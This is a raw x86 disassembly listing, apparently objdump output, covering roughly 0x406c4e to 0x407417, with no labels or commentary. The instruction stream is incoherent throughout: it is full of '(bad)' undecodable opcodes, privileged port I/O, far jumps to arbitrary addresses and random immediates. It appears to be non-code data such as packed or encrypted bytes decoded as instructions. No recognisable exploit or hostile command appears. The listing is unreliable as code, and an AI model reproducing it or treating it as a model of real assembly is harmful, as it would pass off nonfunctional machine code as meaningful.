  406c4e:	fwait
  406c4f:	mov    bh,BYTE PTR [ebx-0x18654c34]
  406c55:	pop    ds
  406c56:	je     0x406ca6
  406c58:	scas   al,BYTE PTR es:[edi]
  406c59:	nop
  406c5a:	jmp    0x406c4e
  406c5c:	lock aad 0xca
  406c5f:	add    al,0xf0
  406c61:	dec    ebp
  406c62:	pusha  
  406c63:	xor    bl,ch
  406c65:	and    BYTE PTR ds:0xf907a685,bl
  406c6b:	inc    ebx
  406c6c:	push   cs
  406c6d:	mov    ch,0x34
  406c6f:	pop    ebp
  406c70:	fst    st(5)
  406c72:	neg    BYTE PTR [ebx+0x3]
  406c75:	push   esi
  406c76:	mov    eax,0xa16ad113
  406c7b:	fld    DWORD PTR [edi]
  406c7d:	fisub  WORD PTR [eax+0x570c5285]
  406c83:	pop    edi
  406c84:	xor    eax,0xb8ea0e85
  406c89:	push   edi
  406c8a:	push   ecx
  406c8b:	mov    ebx,0xee1d0d6c
  406c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c91:	jmp    0xbdbfb082
  406c96:	lods   eax,DWORD PTR ds:[esi]
  406c97:	sbb    dh,0xf3
  406c9a:	push   es
  406c9b:	pop    bx
  406c9d:	outs   dx,DWORD PTR ds:[esi]
  406c9e:	ja     0x406d0c
  406ca0:	out    0xd,eax
  406ca2:	xor    bh,BYTE PTR [ebx]
  406ca4:	push   es
  406ca5:	dec    esi
  406ca6:	pop    ecx
  406ca7:	dec    ecx
  406ca8:	aam    0xfb
  406caa:	mov    bh,0x42
  406cac:	jmp    0xa181:0x463405d1
  406cb3:	and    ecx,ebp
  406cb5:	retf   
  406cb6:	loope  0x406c56
  406cb8:	std    
  406cb9:	xor    DWORD PTR [ecx+0x33],ebp
  406cbc:	in     al,0xba
  406cbe:	aad    0x8b
  406cc0:	push   ebp
  406cc1:	jp     0x406ceb
  406cc3:	mov    bl,0xa3
  406cc5:	adc    ecx,DWORD PTR [ecx-0x2e578f7d]
  406ccb:	fdivr  DWORD PTR [esi-0x3a]
  406cce:	std    
  406ccf:	jmp    0xe5036c6b
  406cd4:	mov    edi,0x5f014ed8
  406cd9:	adc    edx,DWORD PTR [esi+0x5d]
  406cdc:	sbb    al,0xfc
  406cde:	shl    BYTE PTR [edi],cl
  406ce0:	fnsave ds:0x17af8bb
  406ce6:	or     eax,0xa2b65d7
  406ceb:	or     al,0x90
  406ced:	lahf   
  406cee:	push   ecx
  406cef:	and    esp,DWORD PTR [ebp-0x59]
  406cf2:	scas   eax,DWORD PTR es:[edi]
  406cf3:	das    
  406cf4:	fist   DWORD PTR [eax+eiz*1+0x66]
  406cf8:	mov    edx,0xd5d46769
  406cfd:	mov    gs,ecx
  406cff:	jae    0x406c9f
  406d01:	ret    
  406d02:	dec    esi
  406d03:	sub    dl,ah
  406d05:	out    dx,eax
  406d06:	pop    ss
  406d07:	(bad)  
  406d08:	stos   DWORD PTR es:[edi],eax
  406d09:	or     BYTE PTR [ebx-0x25],bl
  406d0c:	cmp    ecx,DWORD PTR ds:[edx-0x31]
  406d10:	adc    BYTE PTR [ebp-0x6c1636fa],al
  406d16:	dec    edi
  406d17:	pushf  
  406d18:	ror    dl,cl
  406d1a:	cmc    
  406d1b:	jle    0x406d1a
  406d1d:	cmp    edi,ebx
  406d1f:	addr16 mov esp,0xe0536d8e
  406d25:	mov    ebp,0x14a7ce8f
  406d2a:	gs mov esi,0xf344916f
  406d30:	inc    edi
  406d31:	cdq    
  406d32:	mov    dl,0x21
  406d34:	sbb    al,0x3f
  406d36:	ror    esp,0xce
  406d39:	imul   edx,DWORD PTR [edx+0x556417f1],0xfffffff0
  406d40:	xchg   ebx,eax
  406d41:	jno    0x406cf4
  406d43:	sub    al,0x8
  406d45:	int3   
  406d46:	ss test al,0xbc
  406d49:	inc    ebp
  406d4a:	aaa    
  406d4b:	cmp    eax,0x6f658f72
  406d50:	cmp    al,cl
  406d52:	cdq    
  406d53:	push   ss
  406d54:	inc    ebp
  406d55:	rol    BYTE PTR [ebx+0x2a52421e],0x34
  406d5c:	cli    
  406d5d:	push   ss
  406d5e:	fs rcr bl,cl
  406d61:	pop    esi
  406d62:	push   ecx
  406d63:	push   esp
  406d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d65:	jmp    0xec23fe60
  406d6a:	retf   0xd50e
  406d6d:	xor    dh,bl
  406d6f:	jnp    0x406cf2
  406d71:	lahf   
  406d72:	clc    
  406d73:	fsub   DWORD PTR [ebx+esi*8+0x15]
  406d77:	nop    DWORD PTR [ebp+0x1f]
  406d7b:	sub    dh,BYTE PTR [ecx+0x6ead4f82]
  406d81:	mov    cl,0x68
  406d83:	je     0x406d52
  406d85:	aad    0x62
  406d87:	sub    DWORD PTR [esi],ecx
  406d89:	sbb    esp,DWORD PTR [edi+esi*8+0x56]
  406d8d:	gs pop es
  406d8f:	or     DWORD PTR [edi],0xdeb083c3
  406d95:	lock out dx,al
  406d97:	ror    DWORD PTR [edx],0xf3
  406d9a:	sbb    eax,0xb810cfa8
  406d9f:	jecxz  0x406dc8
  406da1:	push   ebx
  406da2:	pop    ecx
  406da3:	icebp  
  406da4:	cli    
  406da5:	inc    esi
  406da6:	dec    ebx
  406da7:	adc    BYTE PTR [edi+edx*4+0x8],ah
  406dab:	sub    eax,0x36da7773
  406db0:	ret    0xb8fe
  406db3:	scas   eax,DWORD PTR es:[edi]
  406db4:	sub    cl,BYTE PTR [esi-0x5e7cac06]
  406dba:	add    eax,0x3c9b7d88
  406dbf:	mov    esp,0x4c352197
  406dc4:	push   ebx
  406dc5:	push   cs
  406dc6:	cmp    BYTE PTR [ebp+0x7b946be9],dh
  406dcc:	shl    ah,cl
  406dce:	dec    ebp
  406dcf:	popf   
  406dd0:	daa    
  406dd1:	cmp    BYTE PTR ds:0x3a9edbd5,ch
  406dd7:	bound  eax,QWORD PTR [ebx]
  406dd9:	(bad)  
  406dda:	loopne 0x406db6
  406ddc:	pop    edx
  406ddd:	(bad)  ds:0x308d5fb9
  406de3:	dec    esp
  406de4:	push   ds
  406de5:	jmp    0xe38a7312
  406dea:	push   ebp
  406deb:	call   0x2a3d:0x1f1ba1a7
  406df2:	loope  0x406dc2
  406df4:	xor    BYTE PTR [eax+0x6aeece74],dl
  406dfa:	sub    ah,BYTE PTR [esi+edi*4]
  406dfd:	fmul   QWORD PTR [ebx-0x5e]
  406e00:	setnp  BYTE PTR [esi+ebx*1-0x2f]
  406e05:	pop    ss
  406e06:	fild   DWORD PTR [ecx]
  406e08:	mov    bl,dh
  406e0a:	dec    ebp
  406e0b:	add    BYTE PTR [edi],ah
  406e0d:	mov    ecx,0x3c46229d
  406e12:	lds    esi,FWORD PTR [edx+0x3c]
  406e15:	or     DWORD PTR [edi],eax
  406e17:	ins    DWORD PTR es:[edi],dx
  406e18:	push   cs
  406e19:	mov    edx,0x63481dba
  406e1e:	adc    al,0x1f
  406e20:	stc    
  406e21:	xchg   edx,eax
  406e22:	aam    0xd3
  406e24:	jp     0x406e12
  406e26:	xor    al,0xd6
  406e28:	add    DWORD PTR [ecx-0x12],0x30
  406e2c:	shr    BYTE PTR [edi],0xde
  406e2f:	and    BYTE PTR [ebx],ch
  406e31:	pop    ss
  406e32:	cmp    edx,eax
  406e34:	sub    al,BYTE PTR ds:0xb8ae44f9
  406e3a:	push   ecx
  406e3b:	mov    BYTE PTR [edi-0x3a],dl
  406e3e:	addps  xmm3,XMMWORD PTR [edi-0x32235f00]
  406e45:	bound  esp,QWORD PTR [edi-0x6e42b464]
  406e4b:	xor    DWORD PTR [edi-0x2124c648],edi
  406e51:	(bad)  
  406e52:	fstp   TBYTE PTR [edi+ebp*1]
  406e55:	push   0xffffff90
  406e57:	cmp    bl,ah
  406e59:	inc    ecx
  406e5a:	mov    esi,DWORD PTR [edi+0x5e]
  406e5d:	loope  0x406e34
  406e5f:	or     edi,eax
  406e61:	adc    edx,DWORD PTR [edi-0x2d47e865]
  406e67:	sub    eax,0x11222f1a
  406e6c:	jne    0x406e48
  406e6e:	idiv   DWORD PTR [edx-0x25]
  406e71:	sar    BYTE PTR [ebp+0x12],0x56
  406e75:	ret    0x8681
  406e78:	cmp    ebx,DWORD PTR ds:0x504be93f
  406e7e:	test   eax,0xdb75f4d6
  406e83:	in     al,dx
  406e84:	mov    ah,BYTE PTR [ebp+edx*1-0x1c]
  406e88:	dec    ebp
  406e89:	les    ebp,FWORD PTR es:[edi+0x3b]
  406e8d:	add    esi,DWORD PTR [eax-0x6c6267da]
  406e93:	rol    ecx,cl
  406e95:	jb     0x406ecf
  406e97:	sub    al,0x72
  406e99:	cmp    eax,edi
  406e9b:	into   
  406e9c:	and    ebx,DWORD PTR [ebx+ecx*1+0x7f955e36]
  406ea3:	inc    ebx
  406ea4:	xchg   esi,eax
  406ea5:	xchg   DWORD PTR [ebp+ecx*8+0x1af1c135],esp
  406eac:	mov    ds:0xf7d8defa,eax
  406eb1:	xor    eax,edi
  406eb3:	xchg   esi,eax
  406eb4:	pop    esp
  406eb5:	cmp    DWORD PTR [edx+edi*8-0x7fc52a5c],ecx
  406ebc:	fcomp  QWORD PTR [ebx-0x6b12e9e9]
  406ec2:	ret    
  406ec3:	mov    bl,0xb7
  406ec5:	jnp    0x406f2d
  406ec7:	shl    DWORD PTR ds:0xd2754d5c,0x55
  406ece:	cmp    dh,cl
  406ed0:	lea    eax,[edx-0xe]
  406ed3:	xor    eax,0x7504f6c2
  406ed8:	(bad)  
  406ed9:	retf   0x13de
  406edc:	mov    edx,?
  406ede:	repnz xor al,dl
  406ee1:	cmp    DWORD PTR [ebx-0x6a],ebx
  406ee4:	add    DWORD PTR [esi+0x10],ebx
  406ee7:	(bad)  
  406ee8:	push   esi
  406ee9:	loop   0x406f20
  406eeb:	mov    DWORD PTR [edx],esp
  406eed:	fcom   QWORD PTR [ebx+ebp*8+0x66ffab0f]
  406ef4:	fxch   st(4)
  406ef6:	dec    esp
  406ef7:	dec    esp
  406ef8:	sbb    BYTE PTR [edx],0xe0
  406efb:	cdq    
  406efc:	adc    BYTE PTR [edx-0x53],ah
  406eff:	push   es
  406f00:	pop    edx
  406f01:	bound  edx,QWORD PTR [esi-0x1e]
  406f04:	push   eax
  406f05:	jp     0x406e94
  406f07:	mov    esp,esi
  406f09:	(bad)  
  406f0a:	(bad)  [ebx]
  406f0c:	cs jg  0x406ebb
  406f0f:	xlat   BYTE PTR ds:[ebx]
  406f10:	dec    edi
  406f11:	cmc    
  406f12:	pop    ebx
  406f13:	sub    eax,0x5229a35f
  406f18:	xchg   esp,eax
  406f19:	pop    esi
  406f1a:	mov    ah,0x47
  406f1c:	idiv   bh
  406f1e:	add    eax,0x6d9e030d
  406f23:	(bad)  
  406f24:	out    0xb6,eax
  406f26:	push   esp
  406f27:	xor    BYTE PTR [ecx-0x3a3fb5c],al
  406f2d:	fwait
  406f2e:	jp     0x406eb0
  406f30:	inc    edi
  406f31:	dec    edi
  406f32:	xchg   ebp,eax
  406f33:	fisttp WORD PTR [esp+eiz*2+0x53]
  406f37:	pop    edi
  406f38:	mov    esp,0xbc119929
  406f3d:	(bad)  
  406f3e:	push   ebx
  406f3f:	ret    
  406f40:	sbb    eax,0xe9f82f3c
  406f45:	jne    0x406f1d
  406f47:	or     BYTE PTR [ebx-0x65],dl
  406f4a:	sbb    ecx,DWORD PTR [ebp+0x6f]
  406f4d:	(bad)  
  406f4e:	lods   al,BYTE PTR ds:[esi]
  406f4f:	xor    edi,DWORD PTR [edx]
  406f51:	popa   
  406f52:	cdq    
  406f53:	hlt    
  406f54:	pop    edi
  406f55:	xchg   DWORD PTR ds:[esi-0x1e],ebp
  406f59:	lods   al,BYTE PTR ds:[esi]
  406f5a:	cdq    
  406f5b:	test   BYTE PTR [edi-0x5d030f9c],dh
  406f61:	xor    DWORD PTR [edx+0x6c],edi
  406f64:	pusha  
  406f65:	push   ecx
  406f66:	push   edx
  406f67:	addr16 arpl bp,cx
  406f6a:	scas   eax,DWORD PTR es:[edi]
  406f6b:	popf   
  406f6c:	mov    edx,0x6fe167cc
  406f71:	and    dh,ah
  406f73:	xor    BYTE PTR [ecx+0x371dc1ec],al
  406f79:	adc    eax,0xceab2b39
  406f7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f7f:	mov    BYTE PTR [ebp-0x644f6698],dl
  406f85:	pop    ss
  406f86:	mov    ds:0x1dfb5aa5,al
  406f8b:	pop    edi
  406f8c:	out    0x50,al
  406f8e:	push   esi
  406f8f:	ret    0x9b25
  406f92:	xchg   ebx,ebp
  406f94:	pop    ecx
  406f95:	mul    ah
  406f97:	cwde   
  406f98:	mov    dh,0xae
  406f9a:	jo     0x406fdb
  406f9c:	cli    
  406f9d:	cmp    BYTE PTR [esi],dh
  406f9f:	dec    edi
  406fa0:	jnp    0x406f36
  406fa2:	imul   ecx,DWORD PTR [edi-0x26ea3efd],0x4e
  406fa9:	or     al,0x88
  406fab:	test   eax,0x31e75be4
  406fb0:	outs   dx,DWORD PTR ds:[esi]
  406fb1:	lea    edi,[esi-0x27706cfc]
  406fb7:	sbb    BYTE PTR [ebx-0x1f],ch
  406fba:	and    eax,0x2c61e46f
  406fbf:	popa   
  406fc0:	xor    al,0x65
  406fc2:	int3   
  406fc3:	fcomi  st,st(0)
  406fc5:	cmp    al,0x84
  406fc7:	scas   eax,DWORD PTR es:[edi]
  406fc8:	ins    BYTE PTR es:[edi],dx
  406fc9:	adc    eax,0x237a291d
  406fce:	jmp    0x406ff4
  406fd0:	aas    
  406fd1:	es push edi
  406fd3:	(bad)  
  406fd4:	fild   WORD PTR [eax]
  406fd6:	cdq    
  406fd7:	(bad)  
  406fd8:	int3   
  406fd9:	je     0x407022
  406fdb:	mov    bh,0x18
  406fdd:	xchg   ecx,eax
  406fde:	sub    al,0xae
  406fe0:	jae    0x406f62
  406fe2:	xor    al,0x40
  406fe4:	or     al,0xbf
  406fe6:	or     edx,DWORD PTR [ebp-0xa9b0658]
  406fec:	loopne 0x40702f
  406fee:	mov    esp,0xfc226c11
  406ff3:	xor    BYTE PTR [edx],dh
  406ff5:	imul   BYTE PTR [edi]
  406ff7:	xor    eax,0x4d2543eb
  406ffc:	xlat   BYTE PTR ds:[ebx]
  406ffd:	fcmovnu st,st(5)
  406fff:	adc    al,BYTE PTR [edi+0x4a]
  407002:	adc    eax,0x3fe4966e
  407007:	fsubr  st(6),st
  407009:	adc    edx,DWORD PTR [ebp+0x51e5f514]
  40700f:	pop    ecx
  407010:	out    dx,eax
  407011:	rcr    DWORD PTR [ebp+0x7a3307ad],cl
  407017:	xor    bl,BYTE PTR [ebx+eiz*1-0x35a074d2]
  40701e:	mov    WORD PTR [esi+0x7817bd70],?
  407024:	pop    edx
  407025:	pushf  
  407026:	(bad)  
  407027:	test   al,0x50
  407029:	cmp    esi,DWORD PTR [eax]
  40702b:	in     eax,dx
  40702c:	fwait
  40702d:	scas   al,BYTE PTR es:[edi]
  40702e:	cmp    ch,BYTE PTR [eax+0x5937df1]
  407034:	xor    bh,bh
  407036:	or     al,0x73
  407038:	push   edx
  407039:	js     0x407046
  40703b:	jb     0x407051
  40703d:	test   DWORD PTR [edi],ebx
  40703f:	or     al,0xbd
  407041:	enter  0xa531,0x22
  407045:	js     0x4070a1
  407047:	ja     0x40707f
  407049:	xchg   ecx,eax
  40704a:	cmp    DWORD PTR [edi-0x58],ebx
  40704d:	and    ch,BYTE PTR [esi+0x3d]
  407050:	inc    ebp
  407051:	and    ebp,DWORD PTR [ebx]
  407053:	adc    BYTE PTR [esi],0x1d
  407056:	in     eax,0xa4
  407058:	imul   esi,ebx,0xb7fcf26
  40705e:	xor    BYTE PTR [edi-0xa],bl
  407061:	rol    BYTE PTR [ebx-0xc],cl
  407064:	mov    al,ds:0x8a61ca77
  407069:	pusha  
  40706a:	daa    
  40706b:	and    BYTE PTR [ebx+ebx*1],0xa
  40706f:	out    dx,al
  407070:	into   
  407071:	inc    edi
  407072:	das    
  407073:	push   ds
  407074:	popf   
  407075:	popa   
  407076:	js     0x4070f4
  407078:	mul    eax
  40707a:	repz mov ebx,0xc71334b1
  407080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407081:	fs pop ecx
  407083:	shl    DWORD PTR [ebx-0x18e2698d],0xae
  40708a:	(bad)  
  40708b:	fsub   QWORD PTR [ebp+0x2c]
  40708e:	(bad)  
  40708f:	lea    ebp,[esi+0x64]
  407092:	test   BYTE PTR [esi+eiz*4-0x7987ed79],cl
  407099:	cmp    al,cl
  40709b:	xlat   BYTE PTR ds:[ebx]
  40709c:	scas   al,BYTE PTR es:[edi]
  40709d:	mov    ah,0x32
  40709f:	push   cs
  4070a0:	jmp    0x7ceb:0xc45b1050
  4070a7:	fstp   DWORD PTR [bx-0x1a]
  4070ab:	popa   
  4070ac:	ins    DWORD PTR es:[edi],dx
  4070ad:	cmc    
  4070ae:	out    0xe0,al
  4070b0:	push   0x241a55d4
  4070b5:	in     al,0x1d
  4070b7:	mov    edx,0xbded94b0
  4070bc:	cld    
  4070bd:	pop    ebx
  4070be:	mov    ebp,0x97b48660
  4070c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070c4:	xchg   esi,eax
  4070c5:	mov    ds:0x4a47e970,al
  4070ca:	xor    esp,esp
  4070cc:	mov    ds:0x4c7f0712,eax
  4070d1:	(bad)
  4070d4:	or     BYTE PTR [esi],0xb4
  4070d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070d8:	inc    esp
  4070d9:	cs std 
  4070db:	xchg   esp,eax
  4070dc:	jae    0x407118
  4070de:	repnz fcomp QWORD PTR [ebp-0x53]
  4070e2:	jno    0x40708f
  4070e4:	adc    BYTE PTR [eax+0x2bf89cf6],bl
  4070ea:	cmp    cl,al
  4070ec:	pop    ss
  4070ed:	adc    BYTE PTR [ebx-0x56],bl
  4070f0:	pop    ss
  4070f1:	arpl   WORD PTR [ebx],dx
  4070f3:	mov    dh,0x97
  4070f5:	les    ebx,FWORD PTR [esi+0x52b9d9d]
  4070fb:	(bad)  
  4070fc:	mov    esi,0x49d3e3f9
  407101:	sub    al,0xe0
  407103:	daa    
  407104:	cmp    DWORD PTR [ebx],eax
  407106:	and    dl,ah
  407108:	adc    dl,bh
  40710a:	adc    eax,edi
  40710c:	lds    edx,FWORD PTR [ebx-0x50]
  40710f:	mov    cl,0x43
  407111:	popf   
  407112:	mov    bh,0x17
  407114:	cli    
  407115:	data16 fucomip st,st(7)
  407118:	cwd    
  40711a:	sbb    eax,0x48800c46
  40711f:	or     ebx,esp
  407121:	jno    0x40719d
  407123:	neg    DWORD PTR [edi+0x7c2aaefe]
  407129:	lds    edi,FWORD PTR [edx]
  40712b:	add    di,cx
  40712e:	xor    ebx,esi
  407130:	push   esi
  407131:	xchg   esp,eax
  407132:	test   esp,ebp
  407134:	mov    eax,eax
  407136:	xchg   ebp,eax
  407137:	add    BYTE PTR [eax+0x37054056],bh
  40713d:	(bad)  [eax]
  40713f:	and    BYTE PTR [ecx-0x3b3120fb],dh
  407145:	shl    DWORD PTR [eax-0x1a],0x97
  407149:	fs push esi
  40714b:	(bad)  
  40714c:	in     al,dx
  40714d:	jecxz  0x407101
  40714f:	clc    
  407150:	xchg   edi,ecx
  407152:	aas    
  407153:	cmp    eax,0x7309daa2
  407158:	xchg   edx,eax
  407159:	daa    
  40715a:	jno    0x4070f4
  40715c:	pop    ds
  40715d:	push   esi
  40715e:	div    BYTE PTR [esi]
  407160:	nop
  407161:	pusha  
  407162:	cmc    
  407163:	mov    DWORD PTR ds:0x782558c1,esp
  407169:	(bad)  
  40716b:	push   esi
  40716c:	iret   
  40716d:	xchg   ebp,eax
  40716e:	rol    DWORD PTR [esi],0x9d
  407171:	scas   eax,DWORD PTR es:[edi]
  407172:	test   eax,0xffe392a6
  407177:	in     eax,0xa1
  407179:	sti    
  40717a:	loope  0x407150
  40717c:	ret    0x675c
  40717f:	in     eax,0x0
  407181:	mov    dh,0xf6
  407183:	mul    DWORD PTR [ecx-0x58]
  407186:	inc    dl
  407188:	in     eax,0xcd
  40718a:	adc    al,0xe2
  40718c:	repnz fnstenv [edi]
  40718f:	imul   edi,DWORD PTR [esi+0x5a],0x6d81d4bc
  407196:	xchg   BYTE PTR [ebp+ebp*4-0x7d],cl
  40719a:	pushaw 
  40719c:	enter  0xdc3b,0x83
  4071a0:	imul   esi,ebp,0xffffff9b
  4071a3:	retf   
  4071a4:	call   0xbcf60fd6
  4071a9:	jns    0x407150
  4071ab:	xchg   BYTE PTR [edx-0x5ca7830e],ah
  4071b1:	ja     0x40715c
  4071b3:	shl    DWORD PTR [esi+0x6e8b5060],1
  4071b9:	push   cs
  4071ba:	int3   
  4071bb:	test   ebp,esi
  4071bd:	cmc    
  4071be:	mov    gs,WORD PTR [ecx]
  4071c0:	rol    DWORD PTR [ebp-0x56],cl
  4071c3:	jno    0x40714e
  4071c5:	cmp    eax,ebx
  4071c7:	dec    esi
  4071c8:	inc    edi
  4071c9:	lods   al,BYTE PTR ds:[esi]
  4071ca:	shr    BYTE PTR [edi],cl
  4071cc:	sahf   
  4071cd:	jg     0x4071ad
  4071cf:	cdq    
  4071d0:	dec    edx
  4071d1:	test   al,0xa2
  4071d3:	mov    al,ds:0x6ca0b3bb
  4071d8:	fwait
  4071d9:	and    eax,0x55970a76
  4071de:	test   DWORD PTR [eax-0x2c8669fc],0x9f8ef68a
  4071e8:	mov    ah,0x5a
  4071ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071eb:	pop    es
  4071ec:	ss aaa 
  4071ee:	mov    al,fs:0xfefaa0b6
  4071f4:	pushf  
  4071f5:	pushf  
  4071f6:	in     al,dx
  4071f7:	pop    esp
  4071f8:	fdivr  DWORD PTR [edx]
  4071fa:	sbb    al,0xcf
  4071fc:	outs   dx,DWORD PTR ds:[esi]
  4071fd:	int    0x4d
  4071ff:	iret   
  407200:	inc    esi
  407201:	push   ebx
  407202:	and    al,BYTE PTR [ebp-0x74]
  407205:	loop   0x407204
  407207:	and    BYTE PTR [edi],dh
  407209:	jb     0x40723d
  40720b:	test   BYTE PTR [eax-0x7bc3e167],0x93
  407212:	test   DWORD PTR [edi],esp
  407214:	push   ecx
  407215:	pop    ds
  407216:	imul   ebp,DWORD PTR [ebx+ebp*8],0x72
  40721a:	aas    
  40721b:	imul   esp,DWORD PTR [eax+esi*4+0x19ad8a69],0x976d2287
  407226:	pop    ds
  407227:	sbb    bh,BYTE PTR [ecx-0x4f36be15]
  40722d:	jns    0x407298
  40722f:	repz sub dh,0xd6
  407233:	dec    ebp
  407234:	loopne 0x407237
  407236:	cmp    ch,BYTE PTR [eax-0x56]
  407239:	add    eax,0x5bbd691
  40723e:	jnp    0x40727d
  407240:	pop    ecx
  407241:	scas   al,BYTE PTR es:[edi]
  407242:	or     dl,BYTE PTR [ecx+esi*1+0x66]
  407246:	in     al,dx
  407247:	fs loop 0x4072b8
  40724a:	mov    ds:0x6312fb59,al
  40724f:	xor    BYTE PTR ss:[ecx+0x65],al
  407253:	mov    ah,BYTE PTR [ebx+0x4c]
  407256:	stc    
  407257:	ins    BYTE PTR es:[edi],dx
  407258:	mov    esi,0x26a9c44c
  40725d:	cdq    
  40725e:	push   ebx
  40725f:	test   DWORD PTR [edi],ebp
  407261:	scas   al,BYTE PTR es:[edi]
  407262:	push   esi
  407263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407264:	xor    al,ah
  407266:	push   esi
  407267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407268:	push   ebx
  407269:	mov    edx,0xe34b4bac
  40726e:	mov    esp,0xcae70856
  407273:	leave  
  407274:	mov    ah,0xa7
  407276:	jle    0x4072b5
  407278:	and    dl,dl
  40727a:	mov    edi,0x6ba7db11
  40727f:	outs   dx,DWORD PTR ds:[esi]
  407280:	iret   
  407281:	cmp    edi,DWORD PTR [ebx+0xe]
  407284:	addr16 out 0x63,al
  407287:	or     BYTE PTR [esi-0x7b],0xb1
  40728b:	lea    esi,[ecx+0x15f788b1]
  407291:	iret   
  407292:	pop    ds
  407293:	cmp    eax,0xcac7b8ec
  407298:	add    dl,BYTE PTR ds:[edx+0x6c2c0956]
  40729f:	rcr    al,0x4e
  4072a2:	jp     0x40730a
  4072a4:	clc    
  4072a5:	orpd   xmm4,XMMWORD PTR [esi-0x1a]
  4072aa:	push   ss
  4072ab:	mov    edx,0x36674168
  4072b0:	push   ebp
  4072b1:	sbb    edx,0x34
  4072b4:	sbb    DWORD PTR [ebx+ebx*1+0x147a38c7],0x5d
  4072bc:	jp     0x407296
  4072be:	in     eax,0x99
  4072c0:	sbb    dl,BYTE PTR [ebp-0x27]
  4072c3:	push   ds
  4072c4:	mov    al,0x75
  4072c6:	test   eax,0x4b868e6d
  4072cb:	xor    dh,BYTE PTR [ecx-0x1a]
  4072ce:	leave  
  4072cf:	scas   al,BYTE PTR es:[edi]
  4072d0:	mov    DWORD PTR [edx],ebx
  4072d2:	in     al,0xdc
  4072d4:	mov    esi,0x3ecb4dca
  4072d9:	js     0x40725b
  4072db:	data16 test bh,0xc2
  4072df:	xchg   esp,eax
  4072e0:	adc    cl,cl
  4072e2:	sbb    DWORD PTR [esi+0x65de2b31],0xffffffb0
  4072e9:	sbb    esp,DWORD PTR [edi]
  4072eb:	inc    ecx
  4072ec:	mov    dl,0x24
  4072ee:	aam    0x29
  4072f0:	pause  
  4072f2:	lds    ebp,FWORD PTR es:[esi-0x3c]
  4072f6:	rcl    BYTE PTR [edi-0x9],0xef
  4072fa:	add    al,0x59
  4072fc:	pop    ebx
  4072fd:	xor    eax,DWORD PTR [edi-0x1cff5c5c]
  407303:	cmp    edx,DWORD PTR [edi+0x4cae7c1f]
  407309:	adc    cl,cl
  40730b:	sbb    eax,0x125f0b9c
  407310:	lock add eax,0x7a5a3614
  407316:	iret   
  407317:	and    cl,BYTE PTR [esi+0x7c8824eb]
  40731d:	jmp    0x7aff665f
  407322:	mov    ah,0xb6
  407324:	cwde   
  407325:	mov    DWORD PTR [ebx],ebx
  407327:	cs jb  0x4072e4
  40732a:	sbb    al,0xb9
  40732c:	add    eax,0xbd817306
  407331:	clc    
  407332:	dec    edi
  407333:	inc    esp
  407334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407335:	lods   eax,DWORD PTR ds:[esi]
  407336:	aam    0x26
  407338:	stc    
  407339:	xor    eax,0xa88d6eb3
  40733e:	sbb    DWORD PTR [ebp-0x56836527],0x57
  407345:	ret    0xf22e
  407348:	out    0xdc,al
  40734a:	(bad)  
  40734b:	idiv   bh
  40734d:	jne    0x40739f
  40734f:	lods   eax,DWORD PTR ds:[esi]
  407350:	cmp    eax,0xfc1d3482
  407355:	retf   
  407356:	std    
  407357:	or     eax,0xac13e1a7
  40735c:	imul   ebx,DWORD PTR [edx-0x80],0xfffffff4
  407360:	idiv   BYTE PTR [ebp-0x4de491f9]
  407366:	pop    es
  407367:	dec    edx
  407368:	jl     0x40737e
  40736a:	sbb    al,0x6e
  40736c:	iret   
  40736d:	retf   
  40736e:	adc    eax,ebx
  407370:	push   eax
  407371:	or     bh,cl
  407373:	add    edx,DWORD PTR [eax]
  407375:	mov    fs:0xdcc5cbe3,al
  40737b:	inc    edi
  40737c:	ss push edx
  40737e:	int3   
  40737f:	cmp    ch,dh
  407381:	mov    esi,0xf5c4ba2c
  407386:	pop    ss
  407387:	jle    0x40735c
  407389:	arpl   sp,ax
  40738b:	test   BYTE PTR [ecx+0x60],dl
  40738e:	mov    dl,0xb0
  407390:	cmp    ch,BYTE PTR [ebp+0x132443b6]
  407396:	ret    
  407397:	dec    edx
  407398:	popf   
  407399:	fistp  WORD PTR [ebp-0x5f]
  40739c:	inc    edx
  40739d:	ret    0x452f
  4073a0:	test   eax,0xd0d0a82c
  4073a5:	jbe    0x407352
  4073a7:	or     BYTE PTR [ebx],dh
  4073a9:	dec    edx
  4073aa:	push   ebx
  4073ab:	and    DWORD PTR [eax-0x31],edi
  4073ae:	add    DWORD PTR [eax+0x20],eax
  4073b1:	pop    es
  4073b2:	loope  0x407382
  4073b4:	sbb    BYTE PTR [ecx-0x2cba676f],bh
  4073ba:	dec    esi
  4073bb:	jne    0x40741b
  4073bd:	pop    ss
  4073be:	xchg   BYTE PTR [ecx],bh
  4073c0:	mov    ebp,0x9a5ab018
  4073c5:	mov    bl,bh
  4073c7:	popa   
  4073c8:	loopne 0x407356
  4073ca:	mov    esi,0x749ab986
  4073cf:	push   esi
  4073d0:	(bad)  
  4073d1:	pop    ebp
  4073d2:	rcr    DWORD PTR [ebx-0x3f],0xc5
  4073d6:	jae    0x40743e
  4073d8:	mov    al,0x42
  4073da:	or     esp,DWORD PTR [ebx]
  4073dc:	push   ecx
  4073dd:	add    al,0x9d
  4073df:	inc    edi
  4073e0:	das    
  4073e1:	add    DWORD PTR [eax],edx
  4073e3:	push   edi
  4073e4:	lods   al,BYTE PTR ds:[esi]
  4073e5:	call   0xd394fcc1
  4073ea:	xchg   ebp,eax
  4073eb:	mov    edx,0x9741fc19
  4073f0:	aam    0xe6
  4073f2:	pop    esi
  4073f3:	lods   eax,DWORD PTR ds:[esi]
  4073f4:	cdq    
  4073f5:	data16 int3 
  4073f7:	iret   
  4073f8:	out    dx,eax
  4073f9:	popa   
  4073fa:	repnz addr16 test eax,0x2b3c7f82
  407401:	cmp    cl,0x8b
  407404:	mov    dh,0xaa
  407406:	or     ecx,DWORD PTR [ecx-0x7e467ef0]
  40740c:	adc    al,0x4e
  40740e:	enter  0x18ee,0xc2
  407412:	mov    edx,0x77605fe1
  407417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
